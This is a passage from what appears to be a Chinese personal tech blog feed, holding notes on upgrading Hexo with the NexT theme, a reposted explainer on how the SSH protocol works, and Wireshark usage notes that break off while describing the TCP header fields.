class="line"><span class="title">nvm</span> use <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title">nvm</span> alias default <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"># automatically</span> source nvm on login</span><br><span class="line">echo '[ -e ~/.nvm/nvm.sh ] &amp;&amp; source ~/.nvm/nvm.sh' &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="如没安装cnpm"><a href="#如没安装cnpm" class="headerlink" title="如没安装cnpm"></a>如没安装cnpm</h3><p>用的淘宝家的镜像</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> install cnpm -g --registry=https://registry.<span class="built_in">npm</span>.taobao.org</span><br></pre></td></tr></table></figure><h3 id="升级hexo"><a href="#升级hexo" class="headerlink" title="升级hexo"></a>升级hexo</h3><p>简单粗暴全局升级hexo-cli</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm i hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><h3 id="cnpm-outdated检查hexo-需要更新的组件"><a href="#cnpm-outdated检查hexo-需要更新的组件" class="headerlink" title="cnpm outdated检查hexo 需要更新的组件"></a>cnpm outdated检查hexo 需要更新的组件</h3><p>使用 <code>cnpm outdated</code> 查看哪些组件需要更新版本</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cnpm outdated</span><br><span class="line">Package                          Current  Wanted  Latest  Location</span><br><span class="line">babel-runtime                     linked  <span class="number">6.26</span><span class="number">.0</span>  <span class="number">6.26</span><span class="number">.0</span>  hexo-site</span><br><span class="line">eslint-config-theme-next          linked   <span class="number">1.1</span><span class="number">.3</span>   <span class="number">1.1</span><span class="number">.3</span>  hexo-site</span><br><span class="line">hexo                              linked   <span class="number">4.0</span><span class="number">.0</span>   <span class="number">4.0</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-addlink                      linked   <span class="number">1.0</span><span class="number">.4</span>   <span class="number">1.0</span><span class="number">.4</span>  hexo-site</span><br><span class="line">hexo-all-minifier                 linked   <span class="number">0.5</span><span class="number">.3</span>   <span class="number">0.5</span><span class="number">.3</span>  hexo-site</span><br><span class="line">hexo-<span class="built_in">auto</span>nofollow                 linked   <span class="number">1.0</span><span class="number">.1</span>   <span class="number">1.0</span><span class="number">.1</span>  hexo-site</span><br><span class="line">hexo-deployer-git                 linked   <span class="number">2.1</span><span class="number">.0</span>   <span class="number">2.1</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-filter-optimize              linked   <span class="number">0.2</span><span class="number">.7</span>   <span class="number">0.2</span><span class="number">.7</span>  hexo-site</span><br><span class="line">hexo-generator-baidu-sitemap      linked   <span class="number">0.1</span><span class="number">.6</span>   <span class="number">0.1</span><span class="number">.6</span>  hexo-site</span><br><span class="line">hexo-generator-feed               linked   <span class="number">2.2</span><span class="number">.0</span>   <span class="number">2.2</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-generator-search             linked   <span class="number">2.4</span><span class="number">.0</span>   <span class="number">2.4</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-generator-searchdb           linked   <span class="number">1.2</span><span class="number">.0</span>   <span class="number">1.2</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-generator-sitemap            linked   <span class="number">2.0</span><span class="number">.0</span>   <span class="number">2.0</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-leancloud-counter-security   linked   <span class="number">1.4</span><span class="number">.1</span>   <span class="number">1.4</span><span class="number">.1</span>  hexo-site</span><br><span class="line">hexo-next-title                   linked     git     git  hexo-site</span><br><span class="line">hexo-pdf                          linked   <span class="number">1.1</span><span class="number">.1</span>   <span class="number">1.1</span><span class="number">.1</span>  hexo-site</span><br><span class="line">hexo-symbols-count-time           linked   <span class="number">0.7</span><span class="number">.0</span>   <span class="number">0.7</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-tag-cloud                    linked   <span class="number">2.1</span><span class="number">.1</span>   <span class="number">2.1</span><span class="number">.1</span>  hexo-site</span><br></pre></td></tr></table></figure><p>手工修改 <code>package.json</code> 文件中的版本号</p><h3 id="cnpm-install-–save-更新组件"><a href="#cnpm-install-–save-更新组件" class="headerlink" title="cnpm install –save 更新组件"></a>cnpm install –save 更新组件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm <span class="keyword">install</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure><h3 id="拷贝-next-自定义的swig等"><a href="#拷贝-next-自定义的swig等" class="headerlink" title="拷贝 next 自定义的swig等"></a>拷贝 next 自定义的swig等</h3><p>新版 next 新增支持了不少组件，可以将之前自定义的一些移除，使用新增组件。<br>next 支持自定义的方式发生了改变，将自定义的 swig 可以拷贝到 <code>source/_data/</code> 文件夹下，修改<code>custom_file_path</code> 对应配置</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">custom_file_path:</span><br><span class="line">  head: <span class="keyword">source</span><span class="regexp">/_data/</span>head.swig</span><br><span class="line">  header: <span class="keyword">source</span><span class="regexp">/_data/</span>header.swig</span><br><span class="line">  sidebar: <span class="keyword">source</span><span class="regexp">/_data/</span>sidebar.swig</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没管过hexo，今天升级hexo，切换为next主题 后，遇坑无数，记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="https://blog.yanzhe.tk/categories/hexo/"/>
    
    
      <category term="Hexo" scheme="https://blog.yanzhe.tk/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>SSH 协议原理、组成、认证方式和过程</title>
    <link href="https://blog.yanzhe.tk/2017/12/07/ssh-protocol-introduction/"/>
    <id>https://blog.yanzhe.tk/2017/12/07/ssh-protocol-introduction/</id>
    <published>2017-12-07T07:18:30.000Z</published>
    <updated>2020-08-23T01:48:10.251Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.jianshu.com/p/8e5b7aea52b5">原文链接</a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>SSH</strong>是（Secure SHell protocol） 的简写，安全外壳协议（SSH）是一种在不安全网络上提供安全远程登录及其它安全网络服务的协议。</p><p><strong>OpenSSH</strong> 是SSH （Secure SHell）协议的免费开源实现。SSH协议族可以用来进行远程控制，或在计算机之间传送文件。而实现此功能的传统方式，如telnet(终端仿真协议)、 rcp ftp、 rlogin、rsh都是极为不安全的，并且会使用明文传送密码。OpenSSH提供了服务端后台程序和客户端工具，用来加密远程控件和文件传输过程的中的数据，并由此来代替原来的类似服务。<br>在过去我们使用的rsh和telnet，因为包括登录时的ID和密码数据没有加密就传到网络上，存在安全上的问题。即使在内部网上，也有在因特网上的窃取和篡改等危险性。SSH将包括密码在内的所有数据都已进行了加密处理，可以进行更安全的远程操作。在SSH中，由于协议标准的不同而存在SSH1和SSH2两个不同的版本。SSH2是为了回避SSH1所使用的加密算法的许可证问题而开发的（现在这一许可证问题已经不存在了）。TLES 8中作为安装SSH协议的应用程序采用了开放源码的OpenSSH。OpenSSH与SSH1和SSH2的任何一个协议都能对应，但默认使用SSH2。<br>更详细的说明以及安装使用，请参考官网：<a href="http://www.openssh.com/">http://www.openssh.com/</a></p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul><li><p>类似 telnet 的远程联机使用 shell 的服务器，即 ssh。</p></li><li><p>类似 FTP 服务的 sftp-server ，提供更安全的 FTP 服务。</p><p><img data-src="SSH_1.png" alt="SSH功能"></p></li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img data-src="SSH_2.jpg" alt="SSH工作原理"></p><ol><li>服务器建立公钥： 每一次启动 sshd 服务时，该服务会主动去找 /etc/ssh/ssh_host* 的文件，若系统刚刚安装完成时，由于没有这些公钥，因此 sshd 会主动去计算出这些需要的公钥，同时也会计算出服务器自己需要的私钥。</li><li>客户端主动联机请求： 若客户端想要联机到 ssh 服务器，则需要使用适当的客户端程序来联机，包括 ssh, putty 等客户端程序连接。</li><li>服务器传送公钥给客户端： 接收到客户端的要求后，服务器便将第一个步骤取得的公钥传送给客户端使用 (此时应是明码传送，反正公钥本来就是给大家使用的)。</li><li>客户端记录并比对服务器的公钥数据及随机计算自己的公私钥： 若客户端第一次连接到此服务器，则会将服务器的公钥记录到客户端的用户家目录内的 ~/.ssh/known_hosts 。若是已经记录过该服务器的公钥，则客户端会去比对此次接收到的与之前的记录是否有差异。若接受此公钥， 则开始计算客户端自己的公私钥。</li><li>回传客户端的公钥到服务器端： 用户将自己的公钥传送给服务器。此时服务器：具有服务器的私钥与客户端的公钥，而客户端则是： 具有服务器的公钥以及客户端自己的私钥，你会看到，在此次联机的服务器与客户端的密钥系统 (公钥+私钥) 并不一样，所以才称为非对称加密系统。</li><li>开始双向加解密：<ul><li>(1) 服务器到客户端：服务器传送数据时，拿用户的公钥加密后送出。客户端接收后，用自己的私钥解密</li><li>(2) 客户端到服务器：客户端传送数据时，拿服务器的公钥加密后送出。服务器接收后，用服务器的私钥解密，这样就能保证通信安全。</li></ul></li></ol><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>SSH 主要有三部分组成：</p><ol><li><p>传输层协议(The Transport Layer Protocol) [SSH-TRANS] 提供服务器认证，数据机密性，信息完整性 等的支持。此外它有时还提供压缩功能。 SSH-TRANS 通常运行在 TCP/IP连接上，也可能用于其它可靠数据流上。 SSH-TRANS 提供了强力的加密技术、密码主机认证及完整性保护。该协议中的认证基于主机，并且该协议不执行用户认证。更高层的用户认证协议可以设计为在此协议之上。</p></li><li><p>用户认证协议(The User Authentication Protocol) [SSH-USERAUTH] 用于向服务器提供客户端用户鉴别功能。它运行在传输层协议 SSH-TRANS 上面。当 SSH-USERAUTH 开始后，它从低层协议那里接收会话标识符（从第一次密钥交换中的交换哈希 H ）。会话标识符唯一标识此会话并且适用于标记以证明私钥的所有权。 SSH-USERAUTH 也需要知道低层协议是否提供保密性保护。</p></li><li><p>连接协议(The Connection Protocol) [SSH-CONNECT] 将加密的信息隧道复用成若干个逻辑通道，提供给更高层的应用协议使用； 各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。将多个加密隧道分成逻辑通道。它运行在用户认证协议上。它提供了交互式登录话路、远程命令执行、转发 TCP/IP 连接和转发 X11 连接。<br>　　一旦建立一个安全传输层连接，客户机就发送一个服务请求。当用户认证完成之后，会发送第二个服务请求。这样就允许新定义的协议可以与上述协议共存。连接协议提供了用途广泛的各种通道，有标准的方法用于建立安全交互式会话外壳和转发（“隧道技术”）专有 TCP/IP 端口和 X11 连接。<br>　　通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。</p><p>同时SSH协议框架中还为许多高层的网络安全应用协议提供扩展的支持。它们之间的层次关系可以用如下图来表示：<br><img data-src="SSH-3.png" alt="SSH协议框架"></p></li></ol><h2 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h2><ul><li><p>基于口令的认证：这个就不用说了，就是输入用户名和密码</p></li><li><p>基于密钥的认证，具体步骤如下.</p><p>　*　(1).客户端建立两把钥匙(公钥与私钥)<br>　*　(2).将公钥数据上传到服务器上<br>　*　(3).将公钥放置服务器端的正确目录与文件名（scp 或 ssh-copy-id）</p><p>对于SSH这样以提供安全通讯为目标的协议，其中必不可少的就是一套完备的密钥机制。由于SSH协议是面向互联网网络中主机之间的互访与信息交换，所以主机密钥成为基本的密钥机制。也就是说，SSH协议要求每一个使用本协议的主机都必须至少有一个自己的主机密钥对，服务方通过对客户方主机密钥的认证之后，才能允许其连接请求。一个主机可以使用多个密钥，针对不同的密钥算法而拥有不同的密钥，但是至少有一种是必备的，即通过 DSS算法产生的密钥。关于DSS算法，请参考<a href="http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf">FIPS-186</a> 文档.SSH协议关于主机密钥认证的管理方案有两种，如下图所示:<br><img data-src="SSH_key_manager_1.png" alt="SSH主机密钥认证_主机直发"><br><img data-src="SSH_key_manager_2.png" alt="SSH主机密钥认证_密钥认证中心"></p><p>每一个主机都必须有自己的主机密钥，密钥可以有多对，每一对主机密钥对包括公开密钥和私有密钥。在实际应用过程中怎样使用这些密钥，并依赖它们来实现安全特性呢？如上图所示，SSH协议框架中提出了两种方案。</p><p>在第一种方案中，主机将自己的公用密钥分发给相关的客户机，客户机在访问主机时则使用该主机的公开密钥来加密数据，主机则使用自己的私有密钥来解密数据，从而实现主机密钥认证，确定客户机的可靠身份。在图2（a）中可以看到，用户从主机A上发起操作，去访问，主机B和主机C，此时，A成为客户机，它必须事先配置主机B和主机C的公开密钥，在访问的时候根据主机名来查找相应的公开密钥。对于被访问主机（也就是服务器端）来说则只要保证安全地存储自己的私有密钥就可以了。　</p><p>在第二种方案中，存在一个密钥认证中心，所有系统中提供服务的主机都将自己的公开密钥提交给认证中心，而任何作为客户机的主机则只要保存一份认证中心的公开密钥就可以了。在这种模式下，客户机在访问服务器主机之前，还必须向密钥认证中心请求认证，认证之后才能够正确地连接到目的主机上。</p><p>很显然，第一种方式比较容易实现，但是客户机关于密钥的维护却是个麻烦事，因为每次变更都必须在客户机上有所体现；第二种方式比较完美地解决管理维护问题，然而这样的模式对认证中心的要求很高，在互联网络上要实现这样的集中认证，单单是权威机构的确定就是个大麻烦，有谁能够什么都能说了算呢？但是从长远的发展来看，在企业应用和商业应用领域，采用中心认证的方案是必要的。</p><p>另外，SSH协议框架中还允许对主机密钥的一个折中处理，那就是首次访问免认证。首次访问免认证是指，在某客户机第一次访问主机时，主机不检查主机密钥，而向该客户都发放一个公开密钥的拷贝，这样在以后的访问中则必须使用该密钥，否则会被认为非法而拒绝其访问。</p></li></ul><h2 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h2><p>在整个通讯过程中，为实现 SSH的安全连接，服务器端与客户端要经历如下五个阶段：</p><ul><li>版本号协商阶段，SSH目前包括 SSH1和SSH2两个版本， 双方通过版本协商确定使用的版本</li><li>密钥和算法协商阶段，SSH支持多种加密算法， 双方根据本端和对端支持的算法，协商出最终使用的算法</li><li>认证阶段，SSH客户端向服务器端发起认证请求， 服务器端对客户端进行认证</li><li>会话请求阶段， 认证通过后，客户端向服务器端发送会话请求</li><li>交互会话阶段 ，会话请求通过后，服务器端和客户端进行信息的交互</li></ul><ol><li>版本号协商阶段<br>　　1. 服务器打开端口 22，等待客户端连接。<br>　　2. 客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。<br>　　3. 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。<br>　　4. 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。<br>　　5. 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。</li></ol><blockquote><p>Note： 版本号协商阶段报文都是采用明文方式传输的。</p></blockquote><ol start="2"><li><p>密钥和算法协商阶段<br>　　1. 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等;<br>　　2. 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。<br>　　3. 服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。</p><p>通过以上步骤，服务器端和客户端就取得了相同的会话密钥和会话ID。</p><ul><li>对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全</li><li>在认证阶段，两端会使用会话 ID用于认证过程。</li></ul></li></ol><blockquote><p>Note： 在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。</p></blockquote><ol start="3"><li><p>认证阶段<br>　　1. 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。<br>　　2. 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。<br>　　3. 客户端从认证方法列表中选取一种认证方法再次进行认证。<br>　　4. 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。</p><blockquote><p>SSH提供两种认证方式</p><pre><code>1. password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。2. publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息</code></pre><p>SSH2.0还提供了 password-publickey 认证和 any 认证:<br>　　1. password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。<br>　　2. any认证：指定该用户的认证方式可以是 password，也可以是 publickey。</p></blockquote></li><li><p>会话请求阶段</p><ol><li>服务器等待客户端的请求；</li><li>认证通过后，客户端向服务器发送会话请求；</li><li>服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。</li></ol></li><li><p>交互会话阶段<br>在这个模式下，数据被双向传送：<br>　　1. 客户端将要执行的命令加密后传给服务器;<br>　　2. 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端;<br>　　3. 客户端将接收到的结果解密后显示到终端上.</p></li></ol><h2 id="SSH-Q-amp-A"><a href="#SSH-Q-amp-A" class="headerlink" title="SSH Q&amp;A"></a>SSH Q&amp;A</h2><h3 id="Q1-SSH的版本和区别。"><a href="#Q1-SSH的版本和区别。" class="headerlink" title="Q1: SSH的版本和区别。"></a>Q1: SSH的版本和区别。</h3><p>SSH2避免了RSA的专利问题，并修补了CRC的缺陷。SSH2用数字签名算法（DSA）和Diffie-Hellman（DH）算法代替RSA来完成对称密钥的交换，用HMAC来代替CRC。同时SSH2增加了AES和Twofish等对称加密算法。<br>　　A1: SSH(Secure SHell)到目前为止有两个不兼容的版本——SSH1和SSH2。SSH1又分为1.3和1.5两个版本。SSH1采用DES、3DES、 Blowfish和RC4等对称加密算法保护数据安全传输，而对称加密算法的密钥是通过非对称加密算法（RSA）来完成交换的。SSH1使用循环冗余校验码（CRC）来保证数据的完整性，但是后来发现这种方法有缺陷。<br>更多内容请参考The SSHv1 Protocol &amp; The SSHv2 Protocol</p><h3 id="Q2-什么是HMAC？"><a href="#Q2-什么是HMAC？" class="headerlink" title="Q2: 什么是HMAC？"></a>Q2: 什么是HMAC？</h3><p>　　A2: HMAC(Hash Message Authentication Code) ，散列消息鉴别码，基于密钥的Hash算法的认证协议。消息鉴别码实现鉴别的原理是，用公开函数和密钥产生一个固定长度的值作为认证标识，用这个标识鉴别消息的完整性。使用一个密钥生成一个固定大小的小数据块，即MAC，并将其加入到消息中，然后传输。接收方利用与发送方共享的密钥进行鉴别认证等。</p><h3 id="Q3-什么是X11-forwarding？"><a href="#Q3-什么是X11-forwarding？" class="headerlink" title="Q3: 什么是X11 forwarding？"></a>Q3: 什么是X11 forwarding？</h3><p>　　A3: sh的X11 forwarding特性可以使X client和X server安全地通讯。使用X11 forwarding后，从X client到X Server方向的数据先被送至ssh server，ssh server利用和ssh client的安全通道转发给ssh client，再由ssh client转发给X server，从X server到X client的数据流同理。这里ssh server和ssh client充当了X client和X server间数据的转发器，由于ssh server和X client、ssh client和X server一般在同一台机器上，它们之间是一种安全的进程间通讯，而ssh server和ssh client间的通讯也是安全的，所以X client和X server间的通讯就是安全的。</p><h3 id="Q4-什么是TTY？"><a href="#Q4-什么是TTY？" class="headerlink" title="Q4: 什么是TTY？"></a>Q4: 什么是TTY？</h3><p>　　A4: 终端是一种字符型设备，它有多种类型，通常使用tty来简称各种类型的终端设备。tty是 Teletype的缩写。Teletype是最早出现的一种终端设备，很象电传打字机，是由Teletype公司生产的。设备名放在特殊文件目录/dev/下。</p><h3 id="Q5-简单描述下SSH运行的过程？"><a href="#Q5-简单描述下SSH运行的过程？" class="headerlink" title="Q5: 简单描述下SSH运行的过程？"></a>Q5: 简单描述下SSH运行的过程？</h3><p>A5:简要过程如下</p><ul><li>Client端向Server端发起SSH连接请求。</li><li>Server端向Client端发起版本协商。</li><li>协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。</li><li>Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。</li><li>进入认证阶段。从此以后所有通信均加密。</li><li>认证成功后，进入交互阶段。</li></ul><h2 id="网络图解SSH连接过程"><a href="#网络图解SSH连接过程" class="headerlink" title="网络图解SSH连接过程"></a>网络图解SSH连接过程</h2><p><img data-src="SSH.jpeg" alt="SSH连接过程"></p>]]></content>
    
    <summary type="html">
    
      SSH工作过程：版本号协商，密钥和算法协商，认证，会话请求，交互会话
    
    </summary>
    
    
    
      <category term="SSH" scheme="https://blog.yanzhe.tk/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Wireshark的一些使用笔记</title>
    <link href="https://blog.yanzhe.tk/2017/11/09/notes-for-wireshark/"/>
    <id>https://blog.yanzhe.tk/2017/11/09/notes-for-wireshark/</id>
    <published>2017-11-09T03:36:32.000Z</published>
    <updated>2020-08-23T01:48:10.247Z</updated>
    
    <content type="html"><![CDATA[<p>Wireshark（前称Ethereal）是一个免费开源的网络嗅探程序，网络数据包分析软件。网络数据包分析软件的功能是截取网络数据包，并尽可能显示出最为详细的网络数据包数据。</p><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="抓取报文"><a href="#抓取报文" class="headerlink" title="抓取报文"></a>抓取报文</h3><p>下载和安装好Wireshark之后，启动Wireshark并且在接口列表中选择接口名，然后开始在此接口上抓包。<br>点击接口名称之后，就可以看到实时接收的报文。Wireshark会捕捉系统发送和接收的每一个报文。如果抓取的接口是无线并且选项选取的是混合模式，那么也会看到网络上其他报文。<br>上端面板每一行对应一个网络报文，默认显示报文接收时间（相对开始抓取的时间点），源和目标IP地址，使用协议和报文相关信息。点击某一行可以在下面两个窗口看到更多信息。“+”图标显示报文里面每一层的详细信息。底端窗口同时以十六进制和ASCII码的方式列出报文内容。<br>需要停止抓取报文的时候，点击左上角的停止捕获分组按键。</p><blockquote><ul><li>色彩标识:</li></ul></blockquote><p>进行到这里已经看到报文以绿色，蓝色，黑色显示出来。Wireshark通过颜色让各种流量的报文一目了然。比如默认绿色是TCP报文，深蓝色是DNS，浅蓝是UDP，黑色标识出有问题的TCP报文——比如乱序报文。</p><blockquote><ul><li>报文样本:</li></ul></blockquote><p>比如说你在家安装了Wireshark，但家用LAN环境下没有感兴趣的报文可供观察，那么可以去Wireshark wiki下载<a href="http://wiki.wireshark.org/SampleCaptures">报文样本文件</a>。<br>打开一个抓取文件相当简单，在主界面上点击Open并浏览文件即可。也可以在Wireshark里保存自己的抓包文件并稍后打开。</p><h3 id="过滤报文"><a href="#过滤报文" class="headerlink" title="过滤报文"></a>过滤报文</h3><p>如果正在尝试分析问题，比如打电话的时候某一程序发送的报文，可以关闭所有其他使用网络的应用来减少流量。但还是可能有大批报文需要筛选，这时要用到Wireshark过滤器。<br>最基本的方式就是在窗口顶端过滤栏输入并点击Apply（或按下回车）。例如，输入“dns”就会只看到DNS报文。输入的时候，Wireshark会帮助自动完成过滤条件。</p><p>也可使用<code>ip.src ==192.168.1.2 or ip.dst==192.168.1.2</code>只查看源地址或者目标地址是192.168.1.2的报文。<br>其他常用示例<br><code>tcp.port ==80</code>, 端口为80的<br><code>tcp.srcport == 80</code>, 只显示TCP协议的原端口为80的<br><code>http.request.method == GET</code>, 只显示HTTP GET方法的。</p><p>也可以点击Analyze菜单并选择Display Filters来创建新的过滤条件。</p><p>另一件很有趣的事情是你可以右键报文并选择Follow TCP Stream，即是追踪流 -&gt; TCP流。你会看到在服务器和目标端之间的全部会话。关闭窗口之后，你会发现过滤条件自动被引用了——Wireshark显示构成会话的报文。eg:tcp.stream eq 0.<br>客户端报文用红色表示服务器报文则为蓝色。更改为十六进制Dump模式查看载荷的十六进制代码.关闭弹出窗口，Wireshark就只显示所选TCP报文流。现在可以轻松分辨出3次握手信号。</p><h3 id="检查报文"><a href="#检查报文" class="headerlink" title="检查报文"></a>检查报文</h3><p>选中一个报文之后，就可以深入挖掘它的内容了。<br>也可以在这里创建过滤条件——只需右键细节并使用Apply as Filter子菜单，就可以根据此细节创建过滤条件。</p><p><a href="https://community.emc.com/thread/194901">一站式学习Wireshark</a><br><a href="https://www.wireshark.org/docs/wsug_html">官方Wireshark使用文档</a></p><h2 id="查看TCP协议"><a href="#查看TCP协议" class="headerlink" title="查看TCP协议"></a>查看TCP协议</h2><p><a href="http.cap">报文样本</a></p><p>过滤条件，192.168.0.1建立TCP连接<br><code>ip.src==192.168.0.1 and tcp.flags.syn==1</code></p><p>注意：Find Packet也可以用于搜索十六进制字符，比如恶意软件信号，或搜索字符串，比如抓包文件中的协议命令。</p><h3 id="TCP-三次握手建立连接"><a href="#TCP-三次握手建立连接" class="headerlink" title="TCP 三次握手建立连接"></a>TCP 三次握手建立连接</h3><p>TCP/IP通过三次握手建立一个连接。这一过程中的三种报文是：SYN，SYN/ACK，ACK。</p><p>上真相图<br><img data-src="Connection_TCP.png" alt="图解TCP三次握手"></p><p>第一次请求客户端发送一个SYN包，序列号是0。<br><img data-src="TCP_CONNECT_SYN.PNG" alt="SYN"></p><p>第二次请求服务器会发送一个SYN和一个ACK包，序列号是0，ack号是1。<br><img data-src="TCP_CONNECT_SYN_ACK.PNG" alt="SYN,ACK"></p><p>第三次本地客户端请求会发送一个ACK包，序列号是1，ack号是1来回复服务器。<br><img data-src="TCP_CONNECT_ACK.PNG" alt="ACK"></p><h3 id="TCP四次挥手关闭连接"><a href="#TCP四次挥手关闭连接" class="headerlink" title="TCP四次挥手关闭连接"></a>TCP四次挥手关闭连接</h3><p>TCP/IP通过四次挥手关闭一个连接。这一过程中的三种报文是：FIN，FIN/ACK，ACK。</p><p><img data-src="Deconnection_TCP.png" alt="图解TCP四次挥手"></p><blockquote><ul><li>第一次挥手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入<code>FIN_WAIT_1</code>状态；这表示主机1没有数据要发送给主机2了；</li><li>第二次挥手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入<code>FIN_WAIT_2</code>状态；主机2进入<code>CLOSE-WAIT</code>状态；主机2告诉主机1，我“同意”你的关闭请求；</li><li>第三次挥手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入<code>LAST_ACK</code>状态；</li><li>第四次挥手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入<code>TIME_WAIT</code>状态；主机2收到主机1的ACK报文段以后，就<code>CLOSE</code>关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以<code>CLOSE</code>关闭连接了。</li></ul></blockquote><h3 id="TCP整体"><a href="#TCP整体" class="headerlink" title="TCP整体"></a>TCP整体</h3><p><img data-src="TCP%E6%95%B4%E4%BD%93.jpg" alt="TCP整体"></p><h3 id="TCP数据包结构"><a href="#TCP数据包结构" class="headerlink" title="TCP数据包结构"></a>TCP数据包结构</h3><p><img data-src="TCP%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="TCP数据包结构"></p><p>固定首部长度为20字节,可变部分0~40字节(bits),各字段解释：</p><blockquote><ul><li>Source Port，来源连接端口（16位长）－辨识发送连接端口，范围0~65525</li><li>Destination Port，目的连接端口（16位长）－辨识接收连接端口，范围0~65525</li><li>Sequence number，序列号（seq，32位长）TCP 